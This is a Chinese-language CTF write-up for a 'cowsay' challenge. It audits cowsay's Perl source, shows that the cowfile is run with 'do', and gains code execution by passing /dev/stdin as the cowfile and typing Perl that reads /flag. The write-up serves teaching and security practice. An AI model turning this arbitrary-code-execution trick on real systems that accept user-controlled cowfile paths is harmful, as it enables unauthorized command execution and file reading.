# cowsay

- 作者：13m0n4de
- 参考：-
- 难度：-
- 分类：Misc
- 镜像：[svuctf-spring-2024/cowsay](https://ghcr.io/svuctf/svuctf-spring-2024/cowsay:latest)
- 端口：22

## 题目描述

```
$ ssh ctf@{IP} -p {PORT} -oStrictHostKeyChecking=no -oCheckHostIP=no -oUserKnownHostsFile=/dev/null
```

```sh
#!/bin/sh

read -p "Enter the name of the cowfile (e.g., default, sheep, dragon):" cowfile
read -p "Enter the message:" message

/usr/bin/cowsay -f $cowfile $message
```

> Hint: 本题 cowsay 版本为[仓库](https://github.com/tnalpgge/rank-amateur-cowsay)最新，对应 `cowsay-3.04` 。

## 题目解析

**考点**：

- Perl 代码审计
- 远程代码执行

### SSH 登录脚本

SSH 连接后会运行 Bash 脚本：

```bash
#!/bin/sh

read -p "Enter the name of the cowfile (e.g., default, sheep, dragon):" cowfile
read -p "Enter the message:" message

/usr/bin/cowsay -f $cowfile $message
```

`read` 的 `-p` 选项用于显示提示消息，第一行提示用户输入 `cowfile` 的名称，并将用户的输入存放到 `$cowfile` 变量中。

同理，用户输入的消息内容被存放到 `$message` 变量。

随后运行 `cowsay` 命令显示用户输入的消息，使用指定的 `cowfile` 格式化输出。

```bash
/usr/bin/cowsay -f $cowfile $message
```

### cowsay 是什么

来自维基百科：

> cowsay 是一个生成 ASCII 图片的程序，显示一头牛的消息。它也可以使用预先制作的图像，以生成其他动物的图片，如 Linux 的吉祥物企鹅。
>
> 由于它是用 Perl 编写的，它也适用于其他系统，如微软的 Windows。还有一个相关的程序，名为 cowthink，则为一头牛在思考，而不是说话。
>
> .cow 文件能使 cowsay 产生不同样式的“牛”和“眼睛”等。有时，IRC、桌面截图和软件文档中会使用它。它更像黑客文化中的玩笑，但一段时间后，它也较常被一般人使用。在 2007 年，它被选为 Debian 的今日软件包。

使用 `default` 样式显示 `Hello SVUCTF!` 字符串会得到以下命令行输出：

```
$ cowsay -f default Hello SVUCTF!
 _______________
< Hello SVUCTF! >
 ---------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

如果换用 `sheep` 就会是一只羊了：

```
$ cowsay -f sheep Hello SVUCTF!
 _______________
< Hello SVUCTF! >
 ---------------
  \
   \
       __
      UooU\.'@@@@@@`.
      \__/(@@@@@@@@@@)
           (@@@@@@@@)
           `YY~~~~YY'
            ||    ||
```

### 审计源码

源码地址：https://github.com/tnalpgge/rank-amateur-cowsay/blob/master/cowsay

核心代码：

```perl
# L63-L71
&slurp_input;
$Text::Wrap::columns = $opts{'W'};
@message = ($opts{'n'} ? expand(@message) : 
	    split("\n", fill("", "", @message)));
&construct_balloon;
&construct_face;
&get_cow;
print @balloon_lines;
print $the_cow;
```

#### 获取输入

63 行调用 `slurp_input` 子程序获取输入，`slurp_input` 代码如下：

```perl
sub slurp_input {
    unless ($ARGV[0]) {
	chomp(@message = <STDIN>);
    } else {
	&display_usage if $opts{'n'};
	@message = join(' ', @ARGV);
    }
}
```

- 如果没有传递任何命令行参数（即 `ARGV[0]` 变量不存在），则从标准输入中读取所有行，并去除每一行末尾的换行符，存入 `message` 数组中；
- 如果传递了命令行参数，则将参数使用空格拼接成一个字符串，并将此字符串存入 `message` 数组中。

#### 处理输入文本

64-66 行处理输入文本，`W` 选项控制文本行宽，`n` 选项控制文本是否换行。

```perl
$Text::Wrap::columns = $opts{'W'};
@message = ($opts{'n'} ? expand(@message) : 
	    split("\n", fill("", "", @message)));
```

#### 构建文本气泡和动物脸部

67-68 行 `construct_balloon` 和 `construct_face` 子程序用于构建文本气泡和动物脸部样式。

```perl
&construct_balloon;
&construct_face;
```

#### 获取 cowfile

69-71 行调用 `get_cow` 子程序获取指定的 `cowfile` 文件。

> `cowfile` 是 cowsay 的样式文件，以 `.cow` 为后缀。

`get_cow` 子程序代码如下：

```perl
# L154-L179
sub get_cow {
##
## Get a cow from the specified cowfile; otherwise use the default cow
## which was defined above in $the_cow.
##
    my $f = $opts{'f'};
    my $full = "";
    if ($opts{'f'} =~ m,/,) {
	$full = $opts{'f'};
    } else {
	for my $d (split(/:/, $cowpath)) {
	    if (-f "$d/$f") {
		$full = "$d/$f";
		last;
	    } elsif (-f "$d/$f.cow") {
		$full = "$d/$f.cow";
		last;
	    }
	}
	if ($full eq "") {
	    die "$progname: Could not find $f cowfile!\n";
	}
    }
    do $full;
    die "$progname: $@\n" if $@;
}
```

从 `-f` 参数中获取传入的文件路径，如果包含斜杠 `/`，则认为传入的是绝对路径；否则，以 `cowpath` 变量为路径前缀，查找是否有对应文件，比如输入 `sheep` 则会查找 `/usr/share/cows/sheep.cow` 文件。

`cowpath` 变量内容可以通过 `COWPATH` 环境变量指定，也可以是 `%PREFIX%/share/cows`（一般都会是 `/usr/share/cows`）。

```perl
$cowpath = $ENV{'COWPATH'} || '%PREFIX%/share/cows';
```

接下来是**最关键的一行代码**：

```perl
do $full; # L177
```

[`do EXPR`](https://perldoc.perl.org/functions/do) 表示使用 `EXPR` 的值作为文件名并将文件的内容作为 Perl 脚本执行，例如：

```perl
do '/foo/stat.pl';
do './stat.pl';
do '../foo/stat.pl';
```

所以 cowsay 加载样式是直接将 `.cow` 文件作为 Perl 脚本执行，如果我们查看 `/usr/share/cows/default.cow` 默认样式文件，会发现它的内容其实就是一段 Perl 代码，定义了 `the_cow` 变量，用于之后的输出：

```perl
$the_cow = <<"EOC";
        $thoughts   ^__^
         $thoughts  ($eyes)\\_______
            (__)\\       )\\/\\
             $tongue ||----w |
                ||     ||
EOC
```

### 漏洞利用

目前我们能控制 `-f` 参数，可以执行任意路径的 Perl 文件，但系统中并没有合适利用的文件。我们的理想情况是可以执行任意代码，也就是说这个文件的内容可操控。

”如果能输入就好了“

如果你是 Web 选手，可能见过 `/proc/self/fd/0` 或 `/dev/stdin`。

前者是 `/proc` 文件系统的一部分，`/proc/self` 是指当前进程，`fd` 目录包含了该进程的所有文件描述符的符号链接。`0` 代表标准输入文件描述符，所以通过 `/proc/self/fd/0` 即可访问当前进程的标准输入。

后者是一个设备文件，通常是一个符号链接，指向当前进程的标准输入文件描述符，也就是指向 `/proc/self/fd/0`

如果 `cowsay -f /dev/stdin "Hello SVUCTF!"` 或 `cowsay -f /proc/self/fd/0 "Hello SVUCTF!"`，则会从标准输入中读取内容，并作为 Perl 代码执行。

```
$ cowsay -f /dev/stdin "Hello SVUCTF!"
print "Hacked!\n";
print "Perl version: $]\n";
Hacked!
Perl version: 5.038002
 _______________
< Hello SVUCTF! >
 ---------------
```

可以看到输入的两行 Perl 代码被成功执行。

> 注意：在命令行参数中传入消息内容更方便（此题也是这样），不然要按两次 CTRL-D，分别结束消息输入和 Perl 代码输入。

使用 `/dev/stdin` 作为 `cowfile` 路径，输入 `` print `cat /flag`; ``，按下 CTRL-D 结束输入，执行代码获得 Flag：

```
Enter the name of the cowfile (e.g., default, sheep, dragon):/dev/stdin
Enter the message:Hello SVUCTF!
print `cat /flag`;
die "moo~";
flag{GZCTF_dynamic_flag_test}
 _______________
< Hello SVUCTF! >
 ---------------
```

`die "moo~";` 是啥？其实这是一句 Perl 代码，被我写在了 Flag 文件的第一行，避免直接使用 `/flag` 作为 `cowfile`，继而通过代码报错得到 Flag：

```
Enter the name of the cowfile (e.g., default, sheep, dragon):/flag
Enter the message:asdasd
cowsay: moo~ at /flag line 1.
```

## 总结

这可能是历史上第一个利用 cowsay 的 CTF 题，但时隔太久，我已经忘记当时怎么得出这题灵感的了。

可能有选手习惯上网搜索历史漏洞，发现根本没有，于是就放弃了审计代码。

这不算是 cowsay 的漏洞，更多算是应用不当，用户可操纵参数太自由，凑巧 cowsay 的源码又设计为直接执行 `.cow` 文件，给了可乘之机。

看源码是好习惯。
